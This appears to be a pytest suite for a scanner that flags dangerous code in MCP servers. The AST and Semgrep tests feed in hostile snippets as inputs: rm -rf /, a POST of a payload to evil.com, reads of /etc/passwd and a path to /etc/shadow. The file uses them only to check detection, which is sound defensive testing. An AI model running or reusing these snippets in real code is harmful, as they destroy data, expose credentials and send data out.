"""
Axiom Extended Tests — API routes, AI analysis caching, engine
refactoring, error paths, and structured logging.
"""

import pytest
import json
import time
from unittest.mock import patch, AsyncMock, MagicMock

from fastapi.testclient import TestClient

from app.analysis.engine import (
    MCPAnalysisEngine, _scan_cache, _get_cached_scan, _put_scan_cache,
)
from app.analysis.ast_scanner import scan_python_ast, PythonASTScanner
from app.analysis.live_scanner import RuntimeToolAnalyzer
from app.analysis.semgrep_scanner import (
    is_semgrep_available, _parse_semgrep_results, MCP_SEMGREP_RULES,
)
from app.analysis.ai_analysis import (
    generate_mcp_ai_analysis,
    _build_cache_key,
    _analysis_cache,
    _put_cache,
    _get_cached,
    CACHE_TTL_SECONDS,
)
from app.analysis.live_scanner import LiveScanResult, MCPLiveScanner
from app.models.schemas import (
    MCPToolDefinition, MCPResourceDefinition, MCPPromptDefinition,
    MCPServerProfile, Finding, FindingSeverity, FindingCategory,
    RiskLevel, TransportType,
)
from app.utils.logging import (
    setup_logging, get_logger, set_scan_id, get_scan_id, clear_scan_id,
    JSONFormatter,
)


# ============================================================
# Fixtures
# ============================================================

@pytest.fixture
def engine():
    return MCPAnalysisEngine()


@pytest.fixture(autouse=True)
def clear_ai_cache():
    """Ensure AI cache is empty between tests."""
    _analysis_cache.clear()
    yield
    _analysis_cache.clear()


@pytest.fixture
def sample_findings():
    return [
        Finding(
            id="f1",
            severity=FindingSeverity.HIGH,
            category=FindingCategory.TOOL_POISONING,
            title="Suspicious tool description",
            description="Tool has hidden instructions",
        ),
        Finding(
            id="f2",
            severity=FindingSeverity.MEDIUM,
            category=FindingCategory.DATA_EXFILTRATION,
            title="Outbound request",
            description="Server makes HTTP calls",
        ),
    ]


@pytest.fixture
def sample_profile():
    return MCPServerProfile(
        name="test-server",
        tools=[
            MCPToolDefinition(name="search", description="Search the web"),
            MCPToolDefinition(name="read_file", description="Read a file"),
        ],
    )


# ============================================================
# API Route Tests
# ============================================================

class TestAPIRoutes:
    @pytest.fixture
    def client(self):
        from main import app
        return TestClient(app)

    def test_health_endpoint(self, client):
        resp = client.get("/health")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "healthy"
        assert data["service"] == "Axiom"
        assert data["version"] == "0.6.0"

    def test_version_is_consistent(self, client):
        """pyproject, FastAPI metadata, /health and the CLI `version` command agree."""
        import re
        from pathlib import Path
        from typer.testing import CliRunner
        from cli.axiom_cli import app as cli_app
        pyproject = (Path(__file__).resolve().parent.parent / "pyproject.toml").read_text(encoding="utf-8")
        assert re.search(r'^version = "0\.6\.0"$', pyproject, re.M)
        assert client.app.version == "0.6.0"
        res = CliRunner().invoke(cli_app, ["version"])
        assert res.exit_code == 0 and "Axiom v0.6.0" in res.output

    def test_landing_page(self, client):
        resp = client.get("/")
        assert resp.status_code == 200

    def test_dashboard_page(self, client):
        resp = client.get("/dashboard")
        assert resp.status_code == 200

    def test_get_nonexistent_scan(self, client):
        resp = client.get("/api/v1/scan/nonexistent_id")
        assert resp.status_code == 404

    def test_list_scans_empty(self, client):
        resp = client.get("/api/v1/scans")
        assert resp.status_code == 200
        data = resp.json()
        assert "scans" in data
        assert "total" in data

    def test_scan_missing_target(self, client):
        """POST /scan with missing required field returns 422."""
        resp = client.post("/api/v1/scan", json={})
        assert resp.status_code == 422

    def test_get_report_nonexistent(self, client):
        resp = client.get("/api/v1/scan/fake_id/report")
        assert resp.status_code == 404


# ============================================================
# Engine Refactored Extraction Tests
# ============================================================

class TestRefactoredExtraction:
    def test_extract_python_tools_decorator(self):
        content = '''
@server.tool()
async def get_weather(city: str) -> str:
    """Get current weather for a city."""
    return "sunny"
'''
        tools = MCPAnalysisEngine._extract_python_tools(content)
        assert len(tools) == 1
        assert tools[0].name == "get_weather"
        assert "weather" in tools[0].description.lower()

    def test_extract_python_tools_call_tool(self):
        content = '''
@app.call_tool()
def process_data(data: str) -> str:
    """Process incoming data payload."""
    return data
'''
        tools = MCPAnalysisEngine._extract_python_tools(content)
        assert len(tools) == 1
        assert tools[0].name == "process_data"

    def test_extract_python_tools_empty(self):
        content = "def regular_function(): pass"
        tools = MCPAnalysisEngine._extract_python_tools(content)
        assert len(tools) == 0

    def test_extract_ts_tools_object_literal(self):
        content = '''
const tools = [
    { name: "search", description: "Search the web" },
    { name: "calc", description: "Calculate things" },
];
'''
        tools = MCPAnalysisEngine._extract_ts_tools(content)
        assert len(tools) == 2
        names = {t.name for t in tools}
        assert "search" in names
        assert "calc" in names

    def test_extract_ts_tools_func_call(self):
        content = '''
tool({ name: "deploy", description: "Deploy application" })
'''
        tools = MCPAnalysisEngine._extract_ts_tools(content)
        assert len(tools) >= 1
        assert tools[0].name == "deploy"

    def test_extract_resources(self):
        content = '''resources = [{"uri": "file:///tmp/data", "name": "local data"}]'''
        resources = MCPAnalysisEngine._extract_resources(content)
        assert len(resources) >= 1
        assert any(r.uri.startswith("file://") for r in resources)

    def test_extract_resources_ignores_http(self):
        content = '"https://example.com" "some name"'
        resources = MCPAnalysisEngine._extract_resources(content)
        assert len(resources) == 0

    def test_extract_prompts(self):
        content = '''
{ name: "greeting", description: "Generate a greeting", arguments: [] }
'''
        prompts = MCPAnalysisEngine._extract_prompts(content)
        assert len(prompts) == 1
        assert prompts[0].name == "greeting"

    def test_deduplicate_tools(self):
        tools = [
            MCPToolDefinition(name="search", description="v1"),
            MCPToolDefinition(name="search", description="v2"),
            MCPToolDefinition(name="read", description="read files"),
        ]
        deduped = MCPAnalysisEngine._deduplicate_tools(tools)
        assert len(deduped) == 2
        # First occurrence wins
        assert deduped[0].description == "v1"

    def test_full_extract_definitions(self, engine, tmp_path):
        """End-to-end extraction from directory with mixed files."""
        (tmp_path / "server.py").write_text('''
@server.tool()
async def py_tool(x: str) -> str:
    """A Python tool."""
    return x
''')
        (tmp_path / "index.ts").write_text('''
const tools = [{ name: "ts_tool", description: "A TS tool" }];
''')
        (tmp_path / "README.md").write_text("# Not scanned")

        tools, resources, prompts = engine._extract_mcp_definitions(str(tmp_path))
        names = {t.name for t in tools}
        assert "py_tool" in names
        assert "ts_tool" in names

    def test_skips_node_modules(self, engine, tmp_path):
        """node_modules directory should be skipped."""
        nm = tmp_path / "node_modules" / "evil"
        nm.mkdir(parents=True)
        (nm / "server.js").write_text(
            'server.tool("hidden", "Should not be found", async () => ({ content: [] }));'
        )
        (tmp_path / "server.js").write_text(
            'server.tool("visible", "Should be found", async () => ({ content: [] }));'
        )
        tools, _, _ = engine._extract_mcp_definitions(str(tmp_path))
        names = {t.name for t in tools}
        assert "visible" in names
        assert "hidden" not in names


# ============================================================
# AI Analysis Cache Tests
# ============================================================

class TestAIAnalysisCache:
    def test_cache_key_deterministic(self, sample_findings, sample_profile):
        key1 = _build_cache_key("target", sample_findings, sample_profile)
        key2 = _build_cache_key("target", sample_findings, sample_profile)
        assert key1 == key2

    def test_cache_key_varies_by_target(self, sample_findings, sample_profile):
        key1 = _build_cache_key("server-a", sample_findings, sample_profile)
        key2 = _build_cache_key("server-b", sample_findings, sample_profile)
        assert key1 != key2

    def test_cache_key_varies_by_findings(self, sample_profile):
        findings_a = [Finding(
            id="a", severity=FindingSeverity.HIGH,
            category=FindingCategory.TOOL_POISONING,
            title="A", description="A",
        )]
        findings_b = [Finding(
            id="b", severity=FindingSeverity.LOW,
            category=FindingCategory.METADATA,
            title="B", description="B",
        )]
        key1 = _build_cache_key("t", findings_a, sample_profile)
        key2 = _build_cache_key("t", findings_b, sample_profile)
        assert key1 != key2

    def test_cache_put_and_get(self):
        _put_cache("testkey", {"ai_analysis": "cached result"})
        result = _get_cached("testkey")
        assert result is not None
        assert result["ai_analysis"] == "cached result"

    def test_cache_miss(self):
        assert _get_cached("nonexistent") is None

    def test_cache_expiry(self):
        """Expired entries should not be returned."""
        # Manually insert with old timestamp
        _analysis_cache["old"] = ({"ai_analysis": "stale"}, time.monotonic() - CACHE_TTL_SECONDS - 1)
        assert _get_cached("old") is None

    def test_cache_eviction_when_full(self):
        """Oldest entry evicted when cache exceeds max size."""
        from app.analysis.ai_analysis import CACHE_MAX_SIZE
        for i in range(CACHE_MAX_SIZE):
            _put_cache(f"key_{i}", {"idx": i})
        # All should be present
        assert len(_analysis_cache) == CACHE_MAX_SIZE
        # Adding one more should evict the oldest
        _put_cache("overflow", {"idx": "new"})
        assert len(_analysis_cache) == CACHE_MAX_SIZE
        assert _get_cached("overflow") is not None

    @pytest.mark.asyncio
    async def test_no_api_key_returns_warning(self):
        """When ANTHROPIC_API_KEY is empty, returns warning without calling API."""
        with patch("app.analysis.ai_analysis.settings") as mock_settings:
            mock_settings.ANTHROPIC_API_KEY = ""
            result = await generate_mcp_ai_analysis("test", [], None)
            assert "unavailable" in result["ai_analysis"].lower()
            assert result["tool_poisoning_report"] is None

    @pytest.mark.asyncio
    async def test_cache_hit_skips_api(self, sample_findings, sample_profile):
        """Second call with same inputs should return cached result without API call."""
        cached_result = {
            "ai_analysis": "Cached analysis",
            "claimed_vs_actual": "Cached",
            "tool_poisoning_report": "NONE",
            "prompt_injection_risk": "LOW",
        }
        key = _build_cache_key("test-server", sample_findings, sample_profile)
        _put_cache(key, cached_result)

        with patch("app.analysis.ai_analysis.settings") as mock_settings:
            mock_settings.ANTHROPIC_API_KEY = "test-key"
            result = await generate_mcp_ai_analysis(
                "test-server", sample_findings, sample_profile
            )
            assert result["ai_analysis"] == "Cached analysis"


# ============================================================
# Engine Error Path Tests
# ============================================================

class TestEngineErrorPaths:
    @pytest.mark.asyncio
    async def test_clone_repo_size_exceeded(self, engine):
        """Repos exceeding MAX_REPO_SIZE_MB should raise ValueError."""
        with patch.object(engine, "_check_repo_size", return_value=999):
            with pytest.raises(ValueError, match="exceeding"):
                await engine._clone_repo("https://github.com/huge/repo")

    @pytest.mark.asyncio
    async def test_clone_repo_size_ok(self, engine):
        """Repos under the limit should proceed to clone."""
        with patch.object(engine, "_check_repo_size", return_value=5):
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(returncode=1)
                result = await engine._clone_repo("https://github.com/small/repo")
                assert result is None  # Clone failed but no size error
                mock_run.assert_called_once()

    @pytest.mark.asyncio
    async def test_clone_repo_timeout(self, engine):
        """Clone timeout should return None, not crash."""
        import subprocess
        with patch.object(engine, "_check_repo_size", return_value=5):
            with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("git", 60)):
                result = await engine._clone_repo("https://github.com/slow/repo")
                assert result is None

    @pytest.mark.asyncio
    async def test_scan_no_url_returns_info_finding(self, engine):
        """Scanning a non-URL target without resolution returns info finding."""
        # The name looks like a package; the registries (not contacted here) do not know it.
        with patch("app.analysis.package_resolver.resolve_package", new=AsyncMock(return_value=None)):
            result = await engine.scan("totally-fake-no-resolve-name")
            assert result["status"] == "completed"
            info = [f for f in result["findings"] if f.id == "no_source"]
            assert len(info) == 1

    def test_risk_score_empty(self, engine):
        assert engine._calculate_risk_score([]) == 0.0

    def test_risk_level_boundaries(self, engine):
        assert engine._score_to_level(0) == RiskLevel.SAFE
        assert engine._score_to_level(10) == RiskLevel.LOW
        assert engine._score_to_level(25) == RiskLevel.MEDIUM
        assert engine._score_to_level(50) == RiskLevel.HIGH
        assert engine._score_to_level(75) == RiskLevel.CRITICAL


# ============================================================
# Live Scanner Error Path Tests
# ============================================================

class TestLiveScannerErrors:
    def test_live_scan_result_error_serialization(self):
        result = LiveScanResult(
            server_name="broken",
            status="error",
            error="Overall scan timeout (120s) exceeded",
        )
        d = result.to_dict()
        assert d["status"] == "error"
        assert "120s" in d["error"]

    def test_infer_name_npx(self):
        scanner = MCPLiveScanner()
        name = scanner._infer_name("npx", ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"])
        assert name == "server-filesystem"

    def test_infer_name_python(self):
        scanner = MCPLiveScanner()
        name = scanner._infer_name("python", ["server.py"])
        assert name == "server"

    def test_infer_name_fallback(self):
        scanner = MCPLiveScanner()
        name = scanner._infer_name("custom-bin", [])
        assert name == "custom-bin"


# ============================================================
# Structured Logging Tests
# ============================================================

class TestStructuredLogging:
    def test_scan_id_context(self):
        """Scan ID should be settable and retrievable."""
        assert get_scan_id() is None
        sid = set_scan_id("test_123")
        assert sid == "test_123"
        assert get_scan_id() == "test_123"
        clear_scan_id()
        assert get_scan_id() is None

    def test_scan_id_auto_generate(self):
        sid = set_scan_id()
        assert sid.startswith("scan_")
        assert len(sid) > 5
        clear_scan_id()

    def test_json_formatter_basic(self):
        import logging
        formatter = JSONFormatter()
        record = logging.LogRecord(
            name="mcpguard.test", level=logging.INFO, pathname="",
            lineno=0, msg="Test message", args=(), exc_info=None,
        )
        output = formatter.format(record)
        data = json.loads(output)
        assert data["level"] == "INFO"
        assert data["msg"] == "Test message"
        assert "ts" in data

    def test_json_formatter_with_scan_id(self):
        import logging
        set_scan_id("corr_abc")
        formatter = JSONFormatter()
        record = logging.LogRecord(
            name="mcpguard.test", level=logging.INFO, pathname="",
            lineno=0, msg="With correlation", args=(), exc_info=None,
        )
        output = formatter.format(record)
        data = json.loads(output)
        assert data["scan_id"] == "corr_abc"
        clear_scan_id()

    def test_json_formatter_extra_fields(self):
        import logging
        formatter = JSONFormatter()
        record = logging.LogRecord(
            name="mcpguard.test", level=logging.INFO, pathname="",
            lineno=0, msg="Scan done", args=(), exc_info=None,
        )
        record.target = "test-server"
        record.risk_score = 45.0
        record.finding_count = 12
        output = formatter.format(record)
        data = json.loads(output)
        assert data["target"] == "test-server"
        assert data["risk_score"] == 45.0
        assert data["finding_count"] == 12

    def test_get_logger_namespace(self):
        lg = get_logger("engine")
        assert lg.name == "axiom.engine"

    def test_setup_logging_idempotent(self):
        """Calling setup_logging twice should not add duplicate handlers."""
        import logging
        root = logging.getLogger("axiom")
        initial_count = len(root.handlers)
        setup_logging(level="INFO", json_output=False)
        setup_logging(level="INFO", json_output=False)
        # Should have at most one handler added
        assert len(root.handlers) <= initial_count + 1


# ============================================================
# AST Scanner Tests
# ============================================================

class TestASTScanner:
    def test_detects_eval(self):
        code = "result = eval(user_input)"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.CODE_EXECUTION for f in findings)
        assert any("eval" in f.title for f in findings)

    def test_detects_exec(self):
        code = "exec(compile(source, '<string>', 'exec'))"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.CODE_EXECUTION for f in findings)

    def test_detects_os_system(self):
        code = "import os\nos.system('rm -rf /')"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.CODE_EXECUTION for f in findings)

    def test_detects_subprocess_shell_true(self):
        code = "import subprocess\nsubprocess.run('ls', shell=True)"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.COMMAND_INJECTION for f in findings)

    def test_detects_subprocess_fstring(self):
        code = 'import subprocess\nsubprocess.run(f"ls {user_input}")'
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.COMMAND_INJECTION for f in findings)

    def test_detects_os_environ_get(self):
        code = "import os\nkey = os.environ.get('SECRET_KEY')"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.CREDENTIAL_THEFT for f in findings)

    def test_detects_os_getenv(self):
        code = "import os\nkey = os.getenv('API_TOKEN')"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.CREDENTIAL_THEFT for f in findings)

    def test_detects_os_environ_subscript(self):
        code = "import os\nkey = os.environ['DB_PASSWORD']"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.CREDENTIAL_THEFT for f in findings)

    def test_detects_requests_post(self):
        code = "import requests\nrequests.post('https://evil.com', data=payload)"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.DATA_EXFILTRATION for f in findings)

    def test_detects_symlink(self):
        code = "import os\nos.symlink('/etc/passwd', '/tmp/link')"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.SANDBOX_ESCAPE for f in findings)

    def test_detects_path_traversal_literal(self):
        code = "path = '../../etc/shadow'"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.SANDBOX_ESCAPE for f in findings)

    def test_detects_sensitive_file_reference(self):
        code = "f = open('/etc/passwd')"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.CREDENTIAL_THEFT for f in findings)

    def test_detects_base64_decode(self):
        code = "import base64\nbase64.b64decode(encoded)"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.OBFUSCATION for f in findings)

    def test_detects_shutil_rmtree(self):
        code = "import shutil\nshutil.rmtree('/important')"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.PERMISSION_OVERSCOPE for f in findings)

    def test_detects_os_walk(self):
        code = "import os\nfor root, dirs, files in os.walk('/'):\n    pass"
        findings = scan_python_ast(code, "test.py")
        assert any(f.category == FindingCategory.PERMISSION_OVERSCOPE for f in findings)

    def test_clean_code_no_findings(self):
        code = '''
def greet(name: str) -> str:
    return f"Hello, {name}!"

class Calculator:
    def add(self, a: int, b: int) -> int:
        return a + b
'''
        findings = scan_python_ast(code, "clean.py")
        assert len(findings) == 0

    def test_ignores_eval_in_comment(self):
        """AST parsing should not flag eval() inside comments."""
        code = "# Don't use eval(user_input) — it's dangerous\nresult = 42"
        findings = scan_python_ast(code, "test.py")
        # No findings because the eval is in a comment
        code_exec = [f for f in findings if f.category == FindingCategory.CODE_EXECUTION]
        assert len(code_exec) == 0

    def test_ignores_eval_in_string(self):
        """AST parsing should not flag eval() inside string literals."""
        code = "msg = 'You should avoid eval(x) in production'"
        findings = scan_python_ast(code, "test.py")
        code_exec = [f for f in findings if f.category == FindingCategory.CODE_EXECUTION]
        assert len(code_exec) == 0

    def test_handles_syntax_error(self):
        """Invalid Python should return empty findings, not crash."""
        code = "def broken(:\n    pass"
        findings = scan_python_ast(code, "broken.py")
        assert findings == []

    def test_line_numbers_correct(self):
        code = "x = 1\ny = 2\nresult = eval('3')"
        findings = scan_python_ast(code, "test.py")
        assert len(findings) == 1
        assert findings[0].line_number == 3


# ============================================================
# SQLite Database Backend Tests
# ============================================================

class TestSQLiteDatabase:
    @pytest.mark.asyncio
    async def test_save_and_get(self, tmp_path):
        """Save a scan and retrieve it by ID."""
        import app.utils.database as db
        db._sqlite_path = str(tmp_path / "test.db")
        db._backend = "sqlite"
        import sqlite3
        with sqlite3.connect(db._sqlite_path) as conn:
            conn.executescript(db._SQLITE_SCHEMA)

        scan_data = {"target": "test-server", "risk_score": 42.0}
        scan_id = await db.save_scan(scan_data)
        assert scan_id.startswith("mcpg_")

        result = await db.get_scan(scan_id)
        assert result is not None
        assert result["target"] == "test-server"
        assert result["risk_score"] == 42.0

    @pytest.mark.asyncio
    async def test_get_nonexistent(self, tmp_path):
        """Getting a nonexistent scan returns None."""
        import app.utils.database as db
        db._sqlite_path = str(tmp_path / "test.db")
        db._backend = "sqlite"
        import sqlite3
        with sqlite3.connect(db._sqlite_path) as conn:
            conn.executescript(db._SQLITE_SCHEMA)

        result = await db.get_scan("mcpg_nonexistent")
        assert result is None

    @pytest.mark.asyncio
    async def test_list_scans_ordered(self, tmp_path):
        """List returns scans in reverse chronological order."""
        import app.utils.database as db
        db._sqlite_path = str(tmp_path / "test.db")
        db._backend = "sqlite"
        import sqlite3
        with sqlite3.connect(db._sqlite_path) as conn:
            conn.executescript(db._SQLITE_SCHEMA)

        await db.save_scan({"target": "first"})
        await db.save_scan({"target": "second"})
        await db.save_scan({"target": "third"})

        results = await db.list_scans(limit=10)
        assert len(results) == 3
        assert results[0]["target"] == "third"  # Most recent first

    @pytest.mark.asyncio
    async def test_list_scans_limit(self, tmp_path):
        """List respects the limit parameter."""
        import app.utils.database as db
        db._sqlite_path = str(tmp_path / "test.db")
        db._backend = "sqlite"
        import sqlite3
        with sqlite3.connect(db._sqlite_path) as conn:
            conn.executescript(db._SQLITE_SCHEMA)

        for i in range(5):
            await db.save_scan({"target": f"server-{i}"})

        results = await db.list_scans(limit=2)
        assert len(results) == 2


# ============================================================
# Scan History Cross-Platform Path Tests
# ============================================================

class TestScanHistoryCrossPlatform:
    def test_default_dir_not_hardcoded_unix(self):
        """Verify the history DB path isn't hardcoded to ~/.axiom."""
        from app.analysis.scan_history import _default_mcpguard_dir
        result = _default_mcpguard_dir()
        # Should return a real path, not empty
        assert len(result) > 0
        # Should NOT just be ~/.axiom on all platforms
        assert "axiom" in result.lower()

    def test_env_override(self, tmp_path):
        """AXIOM_DATA_DIR env var should override the default."""
        custom = str(tmp_path / "custom" / "path")  # must be creatable: reload instantiates ScanHistory()
        with patch.dict("os.environ", {"AXIOM_DATA_DIR": custom}):
            # Re-import to pick up the env var
            import importlib
            import app.analysis.scan_history as sh
            importlib.reload(sh)
            assert sh.MCPGUARD_DIR == custom
            # Restore
            importlib.reload(sh)

    def test_legacy_env_override(self, tmp_path, monkeypatch):
        """Deprecated MCPGUARD_DATA_DIR still works when AXIOM_DATA_DIR is unset."""
        import app.analysis.scan_history as sh
        monkeypatch.delenv("AXIOM_DATA_DIR", raising=False)
        monkeypatch.setenv("MCPGUARD_DATA_DIR", str(tmp_path / "legacy"))
        assert sh._resolve_data_dir() == str(tmp_path / "legacy")

    def test_legacy_default_dir_used_when_only_it_exists(self, tmp_path, monkeypatch):
        import app.analysis.scan_history as sh
        monkeypatch.delenv("AXIOM_DATA_DIR", raising=False)
        monkeypatch.delenv("MCPGUARD_DATA_DIR", raising=False)
        new = tmp_path / "axiom"
        monkeypatch.setattr(sh, "_default_mcpguard_dir", lambda: str(new))
        assert sh._resolve_data_dir() == str(new)
        (tmp_path / "mcpguard").mkdir()
        assert sh._resolve_data_dir() == str(tmp_path / "mcpguard")
        new.mkdir()
        assert sh._resolve_data_dir() == str(new)


# ============================================================
# Deep Schema Diff Tests
# ============================================================

class TestDeepSchemaDiff:
    @pytest.fixture
    def analyzer(self):
        return RuntimeToolAnalyzer()

    def test_detects_added_properties(self, analyzer):
        src = {"properties": {"query": {"type": "string"}}}
        rtm = {"properties": {
            "query": {"type": "string"},
            "webhook_url": {"type": "string"},
        }}
        diff = analyzer._deep_diff_schema(src, rtm)
        assert "webhook_url" in diff["added_properties"]
        assert len(diff["removed_properties"]) == 0
        assert len(diff["changed_properties"]) == 0

    def test_detects_removed_properties(self, analyzer):
        src = {"properties": {
            "query": {"type": "string"},
            "limit": {"type": "integer"},
        }}
        rtm = {"properties": {"query": {"type": "string"}}}
        diff = analyzer._deep_diff_schema(src, rtm)
        assert "limit" in diff["removed_properties"]
        assert len(diff["added_properties"]) == 0

    def test_detects_changed_properties(self, analyzer):
        src = {"properties": {"query": {"type": "string"}}}
        rtm = {"properties": {"query": {"type": "string", "maxLength": 10000}}}
        diff = analyzer._deep_diff_schema(src, rtm)
        assert "query" in diff["changed_properties"]

    def test_detects_required_changes(self, analyzer):
        src = {"properties": {"a": {"type": "string"}}, "required": ["a"]}
        rtm = {"properties": {"a": {"type": "string"}}, "required": ["a", "b"]}
        diff = analyzer._deep_diff_schema(src, rtm)
        assert diff["required_changed"] is True
        assert "b" in diff["added_required"]

    def test_identical_schemas(self, analyzer):
        schema = {"properties": {"q": {"type": "string"}}, "required": ["q"]}
        diff = analyzer._deep_diff_schema(schema, schema)
        assert diff["added_properties"] == []
        assert diff["removed_properties"] == []
        assert diff["changed_properties"] == []
        assert diff["required_changed"] is False

    def test_empty_schemas(self, analyzer):
        diff = analyzer._deep_diff_schema({}, {})
        assert diff["added_properties"] == []
        assert diff["removed_properties"] == []

    def test_diff_with_suspicious_param_names(self, analyzer):
        """Added params with suspicious names should trigger CRITICAL severity."""
        source = [MCPToolDefinition(
            name="search", description="Search",
            input_schema={"properties": {"query": {"type": "string"}}},
        )]
        runtime = [MCPToolDefinition(
            name="search", description="Search",
            input_schema={"properties": {
                "query": {"type": "string"},
                "callback_url": {"type": "string"},
            }},
        )]
        findings, diff = analyzer.diff_source_vs_runtime(source, runtime, "test")
        schema_findings = [f for f in findings if "schema" in f.title.lower()]
        assert len(schema_findings) == 1
        assert schema_findings[0].severity == FindingSeverity.CRITICAL
        assert "callback_url" in schema_findings[0].description


# ============================================================
# Scan Result Cache Tests
# ============================================================

class TestScanResultCache:
    @pytest.fixture(autouse=True)
    def clear_cache(self):
        _scan_cache.clear()
        yield
        _scan_cache.clear()

    def test_cache_put_and_get(self):
        _put_scan_cache("https://github.com/user/repo", "abc123", {"target": "repo"})
        result = _get_cached_scan("https://github.com/user/repo", "abc123")
        assert result is not None
        assert result["target"] == "repo"

    def test_cache_miss_wrong_sha(self):
        _put_scan_cache("https://github.com/user/repo", "abc123", {"target": "repo"})
        result = _get_cached_scan("https://github.com/user/repo", "def456")
        assert result is None

    def test_cache_miss_wrong_url(self):
        _put_scan_cache("https://github.com/user/repo", "abc123", {"target": "repo"})
        result = _get_cached_scan("https://github.com/other/repo", "abc123")
        assert result is None

    def test_cache_expiry(self):
        import time as _time
        _scan_cache["https://github.com/x/y@old"] = ({"target": "y"}, _time.monotonic() - 7200)
        result = _get_cached_scan("https://github.com/x/y", "old")
        assert result is None

    def test_cache_eviction(self):
        from app.analysis.engine import SCAN_CACHE_MAX
        for i in range(SCAN_CACHE_MAX):
            _put_scan_cache(f"url_{i}", f"sha_{i}", {"idx": i})
        assert len(_scan_cache) == SCAN_CACHE_MAX
        _put_scan_cache("overflow_url", "overflow_sha", {"idx": "new"})
        assert len(_scan_cache) == SCAN_CACHE_MAX
        assert _get_cached_scan("overflow_url", "overflow_sha") is not None


# ============================================================
# Semgrep Integration Tests
# ============================================================

class TestSemgrepIntegration:
    def test_rules_yaml_valid(self):
        """Verify embedded Semgrep rules are valid YAML."""
        import yaml
        rules = yaml.safe_load(MCP_SEMGREP_RULES)
        assert "rules" in rules
        assert len(rules["rules"]) > 0
        for rule in rules["rules"]:
            assert "id" in rule
            assert "patterns" in rule or "pattern" in rule or "pattern-either" in rule

    def test_parse_empty_results(self):
        findings = _parse_semgrep_results({}, "/tmp/scan")
        assert findings == []

    def test_parse_results_with_findings(self):
        output = {
            "results": [
                {
                    "check_id": "mcp-eval-exec",
                    "path": "/tmp/scan/server.py",
                    "start": {"line": 10},
                    "extra": {
                        "message": "Dynamic code execution detected",
                        "lines": "eval(user_input)",
                        "metadata": {
                            "category": "code_execution",
                            "mcpguard_severity": "critical",
                        },
                    },
                },
                {
                    "check_id": "mcp-outbound-request",
                    "path": "/tmp/scan/server.js",
                    "start": {"line": 25},
                    "extra": {
                        "message": "Outbound HTTP request",
                        "lines": "fetch('https://evil.com')",
                        "metadata": {
                            "category": "data_exfiltration",
                            "mcpguard_severity": "high",
                        },
                    },
                },
            ],
        }
        findings = _parse_semgrep_results(output, "/tmp/scan")
        assert len(findings) == 2
        assert findings[0].severity == FindingSeverity.CRITICAL
        assert findings[0].category == FindingCategory.CODE_EXECUTION
        assert "[Semgrep]" in findings[0].title
        assert findings[0].line_number == 10
        assert findings[1].severity == FindingSeverity.HIGH
        assert findings[1].category == FindingCategory.DATA_EXFILTRATION

    def test_is_semgrep_available_type(self):
        """Should return a boolean regardless of installation state."""
        result = is_semgrep_available()
        assert isinstance(result, bool)
